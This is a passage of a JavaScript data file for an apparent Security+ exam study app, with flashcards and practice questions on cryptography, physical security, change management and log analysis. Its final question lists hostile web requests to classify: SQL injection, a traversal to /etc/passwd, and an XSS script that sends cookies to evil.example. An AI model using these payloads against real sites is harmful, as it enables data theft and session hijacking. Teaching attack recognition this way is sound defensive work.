DECK.push(
// ---------- 1.4 Encryption basics ----------
{id:"symm",d:1,o:"1.4",g:"crypt",t:"Symmetric encryption",
 f:"One shared secret key both encrypts and decrypts. Very fast and low overhead, but hard to distribute and doesn't scale: every pair of people needs its own key. Example: AES.",
 q:"A system must encrypt terabytes of backup data quickly with as little processing overhead as possible. Which type of encryption fits BEST?",
 a:["Symmetric encryption","Asymmetric encryption","Hashing","Steganography"],
 w:["","Asymmetric encryption is much slower and is mainly used to exchange keys or sign, not to encrypt bulk data.","Hashing is one-way, so the backups could never be restored.","Steganography hides data inside other files; it isn't built to protect bulk data."],
 c:"one shared key + FAST + bulk data"},
{id:"asym",d:1,o:"1.4",g:"crypt",t:"Asymmetric encryption (public key)",
 f:"A mathematically related key pair. Encrypt with someone's PUBLIC key and only their PRIVATE key can decrypt it. The private key can't be derived from the public key. Slower than symmetric; uses larger keys (3,072-bit RSA is common).",
 q:"Bob wants to send Alice a message only she can read. Which key should Bob use to encrypt it?",
 a:["Alice's public key","Alice's private key","Bob's private key","Bob's public key"],
 w:["","Only Alice has her private key. Bob never has it, and shouldn't.","Encrypting with Bob's private key creates a signature anyone could verify with his public key. It isn't secret.","Then only Bob's private key could decrypt it, and Alice doesn't have that."],
 c:"encrypt with the RECIPIENT'S public key"},
{id:"keyexch",d:1,o:"1.4",g:"crypt",t:"Key exchange and session keys",
 f:"Out-of-band = share the key outside the network (phone, courier, in person). In-band = protect it with more encryption on the network, usually by using asymmetric encryption to deliver a symmetric SESSION key. Session keys should be ephemeral and unpredictable.",
 q:"During a TLS connection, the client uses the server's public key to securely send a random symmetric key, which both sides then use to encrypt the session. Why this combination?",
 a:["Asymmetric safely shares the key; symmetric is fast for the bulk data","Symmetric is more secure than asymmetric, so it replaces it","Asymmetric encryption can't encrypt data at all","It removes the need for certificates"],
 w:["","Neither is simply 'more secure'. They solve different problems: key distribution vs speed.","Asymmetric can encrypt data; it's just too slow for a whole session.","TLS still relies on the server's certificate to trust that public key."],
 c:"asymmetric delivers the key, symmetric does the work"},
{id:"keylen",d:1,o:"1.4",g:"keymgmt",t:"Key length and key stretching",
 f:"Longer keys resist brute force better (128-bit+ symmetric; 3,072-bit+ asymmetric). Key stretching makes a weak key or password stronger by hashing it over and over, so each brute-force guess costs much more time. Examples: PBKDF2, bcrypt.",
 q:"An app stores passwords and wants each brute-force guess to take significantly longer, by running the password through thousands of hashing rounds. What technique is this?",
 a:["Key stretching","Salting","Key escrow","Tokenization"],
 w:["","Salting adds random data so identical passwords hash differently. It defeats rainbow tables, but doesn't repeat the hashing.","Key escrow is a third party holding copies of keys.","Tokenization swaps data for a random placeholder."],
 c:"hash it again and again → slow down guessing"},
{id:"escrow",d:1,o:"1.4",g:"keymgmt",t:"Key escrow",
 f:"A trusted third party (or an internal team) holds copies of decryption keys, so data can be recovered when needed, such as for legal requests or a departed employee's files. Requires strict process and trust.",
 q:"A company requires copies of all employees' encryption keys to be held by a separate, tightly controlled team, so it can recover business data if an employee leaves. What is this?",
 a:["Key escrow","Key stretching","Certificate revocation","Secure enclave"],
 w:["","Key stretching strengthens weak keys by repeated hashing.","Revocation marks a certificate as no longer trusted.","A secure enclave is isolated hardware for secrets on a device."],
 c:"someone else holds a copy of your keys"},
// ---------- 1.4 Where encryption happens ----------
{id:"dataenc",d:1,o:"1.4",g:"encuse",t:"Encrypting data at rest",
 f:"Full-disk or volume encryption (BitLocker, FileVault) protects a whole drive. File encryption (EFS) protects individual files. Databases use transparent encryption (the whole database) or record-level encryption (specific columns, each with its own key).",
 q:"A database holds customer records, and only the SSN and card-number columns need extra protection, each with its own key. Which approach fits?",
 a:["Record-level (column) encryption","Full-disk encryption","Transparent database encryption","A site-to-site VPN"],
 w:["","Full-disk encryption protects the drive if it's stolen, but not specific columns from users of the running database.","Transparent encryption covers the whole database with one key, not separate keys per column.","A VPN protects data in transit, not stored columns."],
 c:"specific columns, separate keys"},
{id:"transenc",d:1,o:"1.4",g:"encuse",t:"Transport encryption and VPNs",
 f:"Protects data moving across a network. In the app: HTTPS. A VPN encrypts everything regardless of app: client VPNs commonly use SSL/TLS, and site-to-site VPNs commonly use IPsec.",
 q:"Two branch offices need ALL traffic between their networks encrypted, whatever application generates it. Which solution fits BEST?",
 a:["Site-to-site IPsec VPN","HTTPS on each web server","Full-disk encryption","Record-level database encryption"],
 w:["","HTTPS only protects web traffic from those servers, not all traffic between sites.","Full-disk encryption protects data at rest, not on the wire.","Database encryption protects stored records."],
 c:"all traffic between sites = site-to-site VPN"},
// ---------- 1.4 Hashing / signatures ----------
{id:"hash",d:1,o:"1.4",g:"hash",t:"Hashing",
 f:"A one-way function that turns any input into a fixed-size digest (a fingerprint). You can't reverse it. Any change to the input changes the hash. Used for integrity checks and password storage. A collision is two inputs with the same hash (why MD5 is retired).",
 q:"A download page lists a SHA-256 value next to the installer. What does comparing that value to your downloaded file prove?",
 a:["The file wasn't altered (integrity)","The file is encrypted (confidentiality)","The publisher can't deny publishing it (non-repudiation)","The server is always reachable (availability)"],
 w:["","A hash doesn't encrypt anything. The file is still readable.","A bare hash isn't tied to an identity. You'd need a digital signature for non-repudiation.","Hashes say nothing about uptime."],
 c:"same hash = unchanged file"},
{id:"salt",d:1,o:"1.4",g:"hash",t:"Salting",
 f:"Adding unique random data to each password before hashing, so identical passwords produce different hashes. Defeats precomputed rainbow tables. The salt is usually stored with the hash. It slows attackers but doesn't fully stop brute force.",
 q:"Two users chose the same password, but their stored hashes are completely different, and precomputed rainbow tables don't work against the database. What explains this?",
 a:["The passwords were salted","The passwords were encrypted with the same key","Key escrow was used","The hashes collided"],
 w:["","Encrypting with the same key would produce identical ciphertext for identical passwords.","Escrow stores keys with a third party; it doesn't change hashes.","A collision is two DIFFERENT inputs giving the SAME hash. This is the opposite."],
 c:"same password, different hash → salt"},
{id:"digsig",d:1,o:"1.4",g:"hash",t:"Digital signature",
 f:"The sender hashes the message and encrypts the HASH with their PRIVATE key. The receiver decrypts it with the sender's PUBLIC key and compares hashes. This proves integrity, authentication and non-repudiation. The message itself doesn't need to be encrypted.",
 q:"Alice digitally signs a contract. Which key does Bob use to VERIFY her signature?",
 a:["Alice's public key","Alice's private key","Bob's private key","A shared symmetric key"],
 w:["","Only Alice has her private key. She uses it to create the signature.","Bob's keys aren't involved in verifying Alice's signature.","Signatures use asymmetric key pairs. A shared key couldn't prove who signed."],
 c:"sign = sender's PRIVATE, verify = sender's PUBLIC"},
// ---------- 1.4 Crypto hardware ----------
{id:"tpm",d:1,o:"1.4",g:"hwcrypto",t:"TPM (Trusted Platform Module)",
 f:"A crypto chip built into one device's motherboard: random number and key generation, unique keys burned in at manufacture, secure storage of keys (such as BitLocker's), and protection against dictionary attacks.",
 q:"A laptop's full-disk encryption keys need to be stored in dedicated hardware on that specific laptop, tied to its motherboard. What provides this?",
 a:["TPM","HSM","Key management system","Certificate authority"],
 w:["","An HSM is a high-end appliance or card for large environments, holding thousands of keys for many systems, not a chip on one laptop.","A KMS is centralized software for managing keys across services.","A CA issues and signs certificates; it doesn't store a laptop's disk key."],
 c:"chip on ONE device's motherboard"},
{id:"hsm",d:1,o:"1.4",g:"hwcrypto",t:"HSM (Hardware Security Module)",
 f:"High-end cryptographic hardware (a plug-in card or appliance) for large environments: securely stores thousands of keys, backs them up, and offloads crypto work as an accelerator. Often clustered with redundant power.",
 q:"A bank's certificate authority needs to protect its root private keys in tamper-resistant hardware and handle a high volume of signing operations. What should it use?",
 a:["HSM","TPM","Secure enclave","Key stretching"],
 w:["","A TPM is a chip for one device, not an enterprise key vault built for high volume.","A secure enclave protects secrets on a single device's processor.","Key stretching is a password-hashing technique, not hardware."],
 c:"enterprise-scale key vault + accelerator"},
{id:"kms",d:1,o:"1.4",g:"hwcrypto",t:"Key management system",
 f:"Centralized software (on-prem or cloud) that creates, stores, rotates and logs keys for many services from one console, keeping keys separate from the data they protect.",
 q:"A company has TLS, SSH and cloud storage keys scattered across dozens of services. It wants one console to create keys, rotate them on schedule and log their use. What should it adopt?",
 a:["A key management system","A TPM in each server","Key escrow","Steganography"],
 w:["","TPMs protect keys on individual devices but don't centrally manage rotation and logging across services.","Escrow means a third party holds copies of keys; it isn't a management platform.","Steganography hides data inside other files."],
 c:"one console: create, rotate, log"},
{id:"enclave",d:1,o:"1.4",g:"hwcrypto",t:"Secure enclave",
 f:"An isolated, protected processor area inside a device (phones and modern CPUs) with its own boot ROM, true random number generator, root keys and real-time memory encryption. Keeps secrets away from the main OS.",
 q:"A phone keeps fingerprint data and root keys in an isolated processor area with its own boot ROM, separate from the main operating system. What is this?",
 a:["Secure enclave","HSM","Key escrow","Tokenization vault"],
 w:["","An HSM is an external card or appliance for large environments, not part of a phone's processor.","Escrow is a third party holding copies of keys.","A tokenization vault stores real values behind tokens, typically for payment data."],
 c:"isolated processor area INSIDE the device"},
// ---------- 1.4 Obfuscation ----------
{id:"stego",d:1,o:"1.4",g:"obfus",t:"Steganography",
 f:"Hiding a message inside another file or medium (the covertext): images, audio, video, network packets, or invisible printer watermarks. Security through obscurity; the data is there, just hidden.",
 q:"An investigator finds that an employee exfiltrated data by embedding it inside ordinary-looking vacation photos posted online. Which technique was used?",
 a:["Steganography","Tokenization","Data masking","Hashing"],
 w:["","Tokenization replaces sensitive values with placeholders.","Masking hides part of a value on display, such as ***-**-1234.","Hashing creates a one-way fingerprint. You can't get the data back from it."],
 c:"hidden INSIDE a normal-looking file"},
{id:"obfus",d:1,o:"1.4",g:"obfus",t:"Obfuscation: tokenization vs masking",
 f:"Obfuscation makes data hard to understand. Tokenization swaps the value for an unrelated placeholder; no math links them, so there's no encryption overhead. Masking hides part of the value from view (***-**-1234); the full value may still be stored.",
 q:"A help desk screen should show only the last four digits of customers' SSNs, though the full number stays in the database for authorized staff. Which technique fits?",
 a:["Data masking","Tokenization","Steganography","Key stretching"],
 w:["","Tokenization replaces the stored value itself. Here the full number stays in the database and is just hidden on screen.","Steganography hides data inside other media.","Key stretching strengthens passwords by repeated hashing."],
 c:"hide part ON SCREEN, full value still stored"},
// ---------- 1.4 Blockchain / certificates ----------
{id:"blockchain",d:1,o:"1.4",g:"cert",t:"Blockchain (open public ledger)",
 f:"A distributed ledger: every participant keeps and replicates a copy of the transaction record, and blocks are chained with hashes, so tampering is evident. Uses: payments, digital identity, supply chain tracking, voting.",
 q:"A supply chain group wants a tamper-evident record of shipments that every partner keeps a replicated copy of, with no single owner. Which technology fits?",
 a:["Blockchain","Key escrow","A certificate revocation list","Steganography"],
 w:["","Escrow stores keys with a third party.","A CRL is one CA's list of revoked certificates; it isn't a shared transaction ledger.","Steganography hides data; it doesn't create a shared record."],
 c:"everyone keeps the ledger"},
{id:"wildcard",d:1,o:"1.4",g:"cert",t:"Wildcard and SAN certificates",
 f:"Wildcard = one certificate for every subdomain at one level (*.example.com). SAN (Subject Alternative Name) = one certificate listing several specific names, even different domains (example.com, example.net, mail.example.org).",
 q:"A company needs one certificate covering shop.example.com, mail.example.com and any future subdomains of example.com. Which certificate type fits BEST?",
 a:["Wildcard certificate","SAN certificate listing today's three names","Self-signed certificate","Code-signing certificate"],
 w:["","A SAN cert covers only the names listed on it. New subdomains would need a reissue.","A self-signed cert isn't trusted by browsers by default.","Code-signing certs sign software, not websites."],
 c:"*.domain = any subdomain (incl. future)"},
{id:"rootca",d:1,o:"1.4",g:"cert",t:"Root of trust and certificate chain",
 f:"Trust flows from a root CA (pre-installed in browsers and OSes, often kept offline) through intermediate CAs to the server's certificate. Each certificate is signed by the one above it. X.509 is the standard certificate format.",
 q:"A browser trusts a website's certificate because it was signed by an intermediate CA, which was signed by a CA already in the browser's trusted store. What is that top CA called?",
 a:["Root CA","Registration authority","Key escrow agent","OCSP responder"],
 w:["","A registration authority verifies identities for a CA but doesn't anchor the chain.","An escrow agent holds copies of keys.","An OCSP responder answers revocation status queries."],
 c:"top of the chain, pre-trusted"},
// ---------- 1.2 Physical security ----------
{id:"bollard",d:1,o:"1.2",g:"phys",t:"Bollards and barricades",
 f:"Physical barriers, such as concrete posts, that stop vehicles while letting people through, and channel foot traffic to specific access points.",
 q:"A company wants to stop vehicles from being driven into its lobby while still letting pedestrians walk in freely. Which control fits BEST?",
 a:["Bollards","Access control vestibule","Fencing with razor wire","Motion-sensing lights"],
 w:["","A vestibule controls PEOPLE one at a time; it doesn't stop a car.","A fence would block pedestrians too.","Lights deter and help cameras, but don't stop a vehicle."],
 c:"stop cars, let people walk"},
{id:"vestibule",d:1,o:"1.2",g:"phys",t:"Access control vestibule (mantrap)",
 f:"A small space between two doors where only one door can be open or unlocked at a time, controlling entry one person or small group at a time. Defeats tailgating.",
 q:"A data center keeps seeing tailgating at its main door. It wants an entry where the inner door can't unlock until the outer door has closed. What should it install?",
 a:["Access control vestibule","Bollards","CCTV","Badge-only door with a sign"],
 w:["","Bollards stop vehicles, not people following each other.","Cameras record tailgating but don't physically stop it.","A single badge door is exactly what's being tailgated now."],
 c:"two doors, one at a time"},
{id:"sensors",d:1,o:"1.2",g:"phys",t:"Physical sensors",
 f:"Infrared = detects heat and motion, light or dark. Pressure = detects force changes (floors, windows). Microwave = motion across large areas. Ultrasonic = sends sound and measures the reflections.",
 q:"A warehouse wants to detect movement across a very large open area overnight. Which sensor type is BEST suited?",
 a:["Microwave","Pressure","Badge reader","Ultrasonic collision sensor on one door"],
 w:["","Pressure sensors only detect force at the specific floor or window they're on.","A badge reader logs entries; it doesn't detect motion.","A single-door sensor can't cover a large open area."],
 c:"LARGE area motion = microwave"},
{id:"twoperson",d:1,o:"1.2",g:"phys",t:"Two-person integrity / control",
 f:"Requires two authorized people to be present to access a sensitive asset or perform a critical action, so no single person can act alone.",
 q:"A bank requires two authorized employees to be present before anyone can open the server vault. Which concept is this?",
 a:["Two-person integrity","Access control vestibule","Least privilege","Job rotation"],
 w:["","A vestibule controls entry one person at a time; it doesn't require two people together.","Least privilege limits permissions; it doesn't require a second person.","Job rotation moves staff between roles over time."],
 c:"no one acts ALONE"},
// ---------- 1.2 Deception ----------
{id:"honeypot",d:1,o:"1.2",g:"decoy",t:"Honeypot",
 f:"A fake system built to attract attackers and record what they do, wasting their time and revealing their tools and techniques.",
 q:"The security team deploys a fake server that looks like an unpatched database, purely to attract attackers and study their techniques. What is it?",
 a:["Honeypot","Honeyfile","Honeytoken","Jump server"],
 w:["","A honeyfile is a single bait FILE placed on a share.","A honeytoken is traceable fake data, such as fake credentials or records.","A jump server is a hardened host admins use to reach secure zones."],
 c:"fake SYSTEM to attract attackers"},
{id:"honeynet",d:1,o:"1.2",g:"decoy",t:"Honeynet",
 f:"A larger deception network of multiple honeypots (servers, workstations, network gear) that looks like a real environment and provides more sources of attacker data.",
 q:"Researchers build a fake network of servers, workstations and a router, all designed to be attacked and monitored. What is this?",
 a:["Honeynet","Honeypot","Screened subnet","Sandbox"],
 w:["","A honeypot is a single decoy system. A whole fake network is a honeynet.","A screened subnet (DMZ) hosts real public-facing services.","A sandbox isolates real code for safe execution, not to lure attackers."],
 c:"a whole fake NETWORK"},
{id:"honeyfile",d:1,o:"1.2",g:"decoy",t:"Honeyfile",
 f:"A bait file with an enticing name (passwords.txt, Salaries_2026.xlsx) placed on a share. Any access triggers an alert, since nobody legitimate should open it.",
 q:"A file named 'passwords.txt' containing fake data sits on a file share, and an alert fires whenever anyone opens it. What is this?",
 a:["Honeyfile","Honeytoken","Honeynet","Data loss prevention"],
 w:["","A honeytoken is traceable fake data, such as fake API keys or records, tracked when used or leaked. The clue here is a bait FILE that alerts when opened.","A honeynet is an entire fake network.","DLP blocks real sensitive data from leaving."],
 c:"bait FILE that alerts on access"},
{id:"honeytoken",d:1,o:"1.2",g:"decoy",t:"Honeytoken",
 f:"Traceable fake data, such as fake API credentials, email addresses, database records or cookies. It gives no real access, but when it's used or shows up somewhere, you know it was stolen and from where.",
 q:"A company plants a fake AWS access key in its code repository. The key grants no access, but alerts the team the moment anyone tries to use it. What is this?",
 a:["Honeytoken","Honeyfile","Honeypot","Key escrow"],
 w:["","A honeyfile is a bait document that alerts when opened. This is fake DATA that alerts when used.","A honeypot is a whole decoy system.","Escrow is a third party holding copies of real keys."],
 c:"fake DATA that's tracked when used"},
// ---------- 1.2 AAA / zero trust ----------
{id:"aaa",d:1,o:"1.2",g:"aaa",t:"AAA: identification, authentication, authorization, accounting",
 f:"Identification = who you claim to be (username). Authentication = proving it (password, MFA). Authorization = what you're allowed to access. Accounting = recording what you did (login time, data sent, logout).",
 q:"A VPN server logs each user's login time, how much data they transferred and when they disconnected. Which part of AAA is this?",
 a:["Accounting","Authentication","Authorization","Identification"],
 w:["","Authentication is proving who you are.","Authorization decides what you can access.","Identification is just claiming an identity, such as a username."],
 c:"logging what you DID"},
{id:"devcert",d:1,o:"1.2",g:"aaa",t:"Authenticating devices with certificates",
 f:"Devices can't type passwords, so the organization's own CA issues each device a signed certificate. The VPN or management tools verify that certificate to authenticate the device.",
 q:"A company wants only company-issued laptops to connect to its VPN, even if a user's password is stolen. What should it use to authenticate the devices?",
 a:["Device certificates signed by the company's CA","Longer user passwords","Accounting logs","A wildcard web certificate"],
 w:["","Longer passwords don't identify the DEVICE.","Accounting records activity; it doesn't authenticate anything.","A wildcard cert secures websites, not individual devices."],
 c:"the device proves itself with a cert"},
{id:"ztcore",d:1,o:"1.2",g:"plane",t:"Zero trust: adaptive identity and threat scope reduction",
 f:"Zero trust verifies everything, every time; nothing is trusted because of where it sits on the network. Adaptive identity weighs context (location, device, connection type, IP) and can demand stronger authentication. Threat scope reduction cuts entry points. Policy-driven access combines both with defined rules.",
 q:"A user logging in from an unknown country on a personal device is required to complete extra MFA, while the same user at the office isn't. Which zero trust concept is this?",
 a:["Adaptive identity","Implicit trust zone","Policy Enforcement Point","Data plane"],
 w:["","Implicit trust is the opposite of zero trust: trusting traffic because of where it comes from.","The PEP enforces the decision; adapting to risk context is adaptive identity.","The data plane carries traffic; it doesn't evaluate login risk."],
 c:"context changes how hard you're checked"},
// ---------- 1.3 Change management ----------
{id:"chgproc",d:1,o:"1.3",g:"chg",t:"Change approval process",
 f:"A formal process: request form, purpose, scope, schedule, affected systems and impact, risk analysis, approval by the change control board (CAB), then end-user acceptance after the change.",
 q:"An engineer wants to change a production firewall. According to a formal change management process, which group must approve it before it happens?",
 a:["The change control board","The engineer's own team, informally","The end users, after the change","Nobody, if it's an emergency fix the engineer is confident in"],
 w:["","Informal team agreement is exactly what change management replaces.","End-user acceptance happens AFTER the change, not as the approval.","Even urgent changes go through a defined (emergency) approval path."],
 c:"formal approval = change control board"},
{id:"chgowner",d:1,o:"1.3",g:"chg",t:"Change ownership vs stakeholders",
 f:"The owner is the person or department that needs the change and manages the process (IT may do the actual work). Stakeholders are everyone affected by the change, often more people than you'd expect.",
 q:"Shipping needs its label printers upgraded. IT will perform the upgrade, but Shipping tracks the process and makes sure it's followed. Who is the change OWNER?",
 a:["The Shipping department","The IT department","The change control board","Accounting, which uses shipping reports"],
 w:["","IT performs the change, but the department that needs it owns the process.","The board approves changes; it doesn't own each one.","Accounting is a stakeholder: affected, but not the owner."],
 c:"whoever NEEDS the change owns it"},
{id:"impact",d:1,o:"1.3",g:"chg",t:"Impact analysis and testing",
 f:"Impact analysis rates the risk of making the change (and of NOT making it): high, medium or low. Test in a sandbox that's isolated from production, and confirm the backout plan works before deploying.",
 q:"Before a major patch, a team installs it on an isolated copy of the production system with no connection to the real network, to confirm it works and that rollback succeeds. What is this?",
 a:["Sandbox testing","Maintenance window","Version control","Stakeholder analysis"],
 w:["","A maintenance window is the scheduled time slot for the change.","Version control tracks changes to files and configs over time.","Stakeholder analysis identifies who's affected."],
 c:"isolated copy, test before production"},
{id:"maintwin",d:1,o:"1.3",g:"chg",t:"Maintenance window",
 f:"The approved time slot for a change, chosen to minimize impact on production, often overnight. Retail may freeze changes entirely during the holidays.",
 q:"A retailer forbids network changes from November through early January, and schedules other changes for 2–4 a.m. Sundays. What is it defining?",
 a:["Maintenance windows","Backout plans","Dependencies","Change ownership"],
 w:["","A backout plan is how you roll back, not when you change.","Dependencies are components that rely on each other.","Ownership is who manages the process."],
 c:"WHEN changes are allowed"},
{id:"chgtech",d:1,o:"1.3",g:"chg",t:"Technical change concerns",
 f:"Dependencies (changing A requires B), restarts of services and apps, downtime (minimize it by failing over to a secondary first), scope limits (approval covers only that exact change), legacy apps, and updating documentation and version control afterward.",
 q:"A firewall code upgrade fails because the firewall management software must be upgraded FIRST to support the new version. Which change management concept was overlooked?",
 a:["Dependencies","Maintenance window","Ownership","Stakeholders"],
 w:["","The timing wasn't the problem; the order of components was.","Ownership is who manages the process.","Stakeholders are the people affected."],
 c:"A needs B first"},
{id:"versionctl",d:1,o:"1.3",g:"chg",t:"Version control and documentation",
 f:"Version control tracks changes to files and configurations over time, so you can see what changed and revert. Diagrams, policies and procedures must be updated as part of every change, or they go stale fast.",
 q:"After a router config change causes problems, an admin instantly views exactly what changed and restores the previous configuration. What made this possible?",
 a:["Version control","A maintenance window","An impact analysis","A change advisory board"],
 w:["","A maintenance window sets when changes happen.","Impact analysis predicts risk beforehand; it doesn't store old configs.","The CAB approves changes; it doesn't track configuration versions."],
 c:"track + revert changes over time"}
);

const PBQ=[
{id:"p-fw-dmz",d:4,o:"4.5",type:"table",t:"Firewall rules: perimeter to DMZ",
 q:"Configure the perimeter firewall. Requirements: (1) anyone on the internet can reach the company website on the web server over an ENCRYPTED connection; (2) outside mail servers can deliver email to the mail server; (3) only the IT admin subnet can manage the web server remotely over an encrypted shell; (4) everything else is blocked. Rules are processed top to bottom. Choose the port and action for each rule.",
 fixed:["Source","Destination"],
 cols:[{h:"Port",o:["22","23","25","53","80","443","3389","Any"]},{h:"Action",o:["Allow","Deny"]}],
 rows:[
  {fx:["Any (internet)","10.0.5.10 · web server"],a:["443","Allow"],why:"HTTPS is TCP 443. Port 80 would serve the site unencrypted, which breaks the 'encrypted connection' requirement."},
  {fx:["Any (internet)","10.0.5.20 · mail server"],a:["25","Allow"],why:"Mail servers deliver to each other with SMTP on TCP 25."},
  {fx:["10.0.1.0/24 · IT admin subnet","10.0.5.10 · web server"],a:["22","Allow"],why:"SSH (TCP 22) is the encrypted remote shell. Telnet (23) sends everything, passwords included, in cleartext. RDP (3389) is Windows remote desktop, not a shell."},
  {fx:["Any","Any"],a:["Any","Deny"],why:"The last rule is an explicit deny-all. Anything not allowed above it gets dropped, which satisfies 'everything else is blocked'."}],
 f:"Least privilege at the network layer: open only the exact port each requirement needs, from only the sources that need it, then deny everything else at the bottom."},

{id:"p-mitig",d:2,o:"2.5",type:"table",t:"Match each attack to its best mitigation",
 q:"For each attack the SOC observed, choose the mitigation that BEST addresses it. Each mitigation is used once at most.",
 fixed:["Attack observed"],
 cols:[{h:"Best mitigation",o:["Parameterized queries / input validation","Account lockout + MFA","Anti-CSRF tokens","Disable USB storage + user training","DNSSEC","Offline, immutable backups","WPA3 with SAE","Patch the hypervisor"]}],
 rows:[
  {fx:["The login form accepts: admin' OR '1'='1' --"],a:["Parameterized queries / input validation"],why:"That's SQL injection. Parameterized queries keep input from ever being run as SQL, and input validation rejects it up front."},
  {fx:["12,000 password guesses against one account from one IP"],a:["Account lockout + MFA"],why:"Brute force on one account. Lockout stops the guessing; MFA means even a correct guess isn't enough."},
  {fx:["A malicious page makes logged-in users' browsers silently submit money transfers"],a:["Anti-CSRF tokens"],why:"That's CSRF. A unique token on each legitimate form means a forged request from another site gets rejected."},
  {fx:["Infected USB drives are left in the parking lot, and one gets plugged in"],a:["Disable USB storage + user training"],why:"A removable-media vector. Block USB storage technically, and train people not to plug in found devices."},
  {fx:["Users typing the correct bank URL land on a fake site because the resolver cache was poisoned"],a:["DNSSEC"],why:"DNS poisoning. DNSSEC signs DNS records so resolvers can reject forged answers."},
  {fx:["Ransomware encrypted the file servers AND the always-connected backup share"],a:["Offline, immutable backups"],why:"Online backups got encrypted too. Offline or immutable copies can't be reached or changed by the malware."}],
 f:"Match the mitigation to how the attack actually works: input attacks need input handling, password attacks need authentication controls, and ransomware needs backups it can't reach."},

{id:"p-ctrlcat",d:1,o:"1.1",type:"table",t:"Sort controls by category",
 q:"Assign each security control to its CATEGORY.",
 fixed:["Control"],
 cols:[{h:"Category",o:["Technical","Managerial","Operational","Physical"]}],
 rows:[
  {fx:["Firewall ACL blocking inbound RDP"],a:["Technical"],why:"Enforced automatically by a system."},
  {fx:["Annual risk assessment"],a:["Managerial"],why:"Planning and oversight: deciding what risks matter and how to handle them."},
  {fx:["Security guard checking badges in the lobby"],a:["Operational"],why:"Carried out by people as part of daily operations. The guard's actions are operational; the lobby gate would be physical."},
  {fx:["Concrete bollards in front of the entrance"],a:["Physical"],why:"A tangible barrier that stops vehicles."},
  {fx:["Security awareness training sessions"],a:["Operational"],why:"People-driven, ongoing activity."},
  {fx:["Full-disk encryption on laptops"],a:["Technical"],why:"Enforced by software on the device."},
  {fx:["Information security policy approved by leadership"],a:["Managerial"],why:"Policies set direction and oversight from management."},
  {fx:["Locked server room door"],a:["Physical"],why:"A tangible barrier around a space."}],
 f:"Technical = systems enforce it. Managerial = planning and oversight. Operational = people do it. Physical = you can touch it."},

{id:"p-ctrltype",d:1,o:"1.1",type:"table",t:"Sort controls by type",
 q:"Assign each control to its TYPE (what it does).",
 fixed:["Control"],
 cols:[{h:"Type",o:["Preventive","Detective","Corrective","Deterrent","Compensating","Directive"]}],
 rows:[
  {fx:["Login banner warning that unauthorized access will be prosecuted"],a:["Deterrent"],why:"It discourages attempts but doesn't actually stop anyone."},
  {fx:["SIEM alert when an account fails 50 logins in a minute"],a:["Detective"],why:"It identifies and reports the activity; it doesn't block it."},
  {fx:["Restoring files from backup after ransomware"],a:["Corrective"],why:"It fixes things after the incident."},
  {fx:["Firewall rule blocking inbound Telnet"],a:["Preventive"],why:"It stops the connection from happening at all."},
  {fx:["Strict password rules plus extra monitoring, because MFA can't be deployed"],a:["Compensating"],why:"A substitute for a primary control that can't be implemented."},
  {fx:["Acceptable use policy that employees must follow"],a:["Directive"],why:"It tells people what they must or must not do."}],
 f:"Ask what the control DOES: stops it (preventive), spots it (detective), fixes it (corrective), discourages it (deterrent), stands in for something else (compensating), or tells people the rules (directive)."},

{id:"p-irorder",d:4,o:"4.8",type:"order",t:"Incident response process",
 q:"Put the CompTIA incident response phases in order, from first to last. Use the arrows to move items.",
 items:["Preparation","Detection","Analysis","Containment","Eradication","Recovery","Lessons learned"],
 why:["Build the plan, team, tools and training BEFORE anything happens.","Notice that something may be wrong: alerts, reports, logs.","Confirm it's a real incident, then work out its scope and severity.","Stop the spread: isolate hosts, block accounts or IPs.","Remove the threat: malware, backdoors, unauthorized accounts.","Restore systems to normal operation and monitor them.","Review what happened and improve the plan. Always last."],
 f:"P-D-A-C-E-R-L. You can't eradicate what you haven't contained, and you can't recover a box that's still infected."},

{id:"p-volatility",d:4,o:"4.8",type:"order",t:"Order of volatility",
 q:"A compromised server is still running. Put the evidence sources in the order you should collect them, MOST volatile first.",
 items:["CPU registers and cache","RAM (system memory)","Swap file and temporary files","Local hard drive","Logs on a remote syslog server","Backup tapes and archives"],
 why:["Changes in nanoseconds. Gone almost immediately.","Lost the moment the machine powers off.","On disk, but constantly overwritten while the system runs.","Survives a reboot, but can still be changed or wiped.","Stored off the box, so the attacker is less likely to touch it.","The most stable source. Collect it last."],
 f:"Collect whatever disappears fastest first. RAM always comes before the disk image."},

{id:"p-spray",d:2,o:"2.4",type:"select",t:"Log analysis: password spraying",
 q:"Review this authentication log. Select EVERY line that's part of the password spraying attack, including any sign that it worked. Leave normal activity unselected.",
 lines:[
  {x:"09:02:11 SUCCESS user=jsmith src=10.0.1.44",hit:false,why:"A normal internal login."},
  {x:"09:14:03 FAIL    user=agarcia src=203.0.113.50",hit:true,why:"External IP, one attempt on this account. The spray starts here."},
  {x:"09:14:41 FAIL    user=bnguyen src=203.0.113.50",hit:true,why:"Same IP, a different account, one attempt."},
  {x:"09:15:09 FAIL    user=jsmith src=10.0.1.44",hit:false,why:"jsmith's own workstation and a single typo. Same user, same internal IP as his earlier login."},
  {x:"09:15:22 FAIL    user=cpatel src=203.0.113.50",hit:true,why:"Same IP, yet another account."},
  {x:"09:16:05 FAIL    user=dkim src=203.0.113.50",hit:true,why:"Same pattern: one try per account, so no lockouts."},
  {x:"09:16:30 SUCCESS user=mlee src=10.0.1.52",hit:false,why:"A normal internal login."},
  {x:"09:17:48 SUCCESS user=epark src=203.0.113.50",hit:true,why:"The spray WORKED. The same external IP got into epark's account. This is the most urgent line: disable the account and investigate the session."},
  {x:"09:20:14 LOCKOUT user=tjones src=10.0.1.60 failures=5",hit:false,why:"Five failures on ONE account from an internal host. That's a user problem or a brute-force pattern, not spraying, which deliberately avoids lockouts."}],
 f:"Password spraying signature: one source, many accounts, one attempt each, no lockouts. Then hunt for a SUCCESS from that same source."},

{id:"p-weblog",d:2,o:"2.4",type:"table",t:"Log analysis: classify web requests",
 q:"Classify each request from the web server log.",
 fixed:["Request"],mono:true,
 cols:[{h:"Classification",o:["Normal","SQL injection","Cross-site scripting","Directory traversal","Command injection"]}],
 rows:[
  {fx:["GET /products?id=42"],a:["Normal"],why:"An ordinary product lookup."},
  {fx:["GET /products?id=42' UNION SELECT username,password FROM users--"],a:["SQL injection"],why:"The quote breaks out of the query, and UNION SELECT pulls data from another table."},
  {fx:["GET /download?file=../../../../etc/passwd"],a:["Directory traversal"],why:"The ../ sequences climb out of the web folder to reach a system file."},
  {fx:["POST /reviews  body=<script>fetch('//evil.example/c?'+document.cookie)<\/script>"],a:["Cross-site scripting"],why:"Script stored in a review runs in every viewer's browser and sends their cookies to the attacker."},
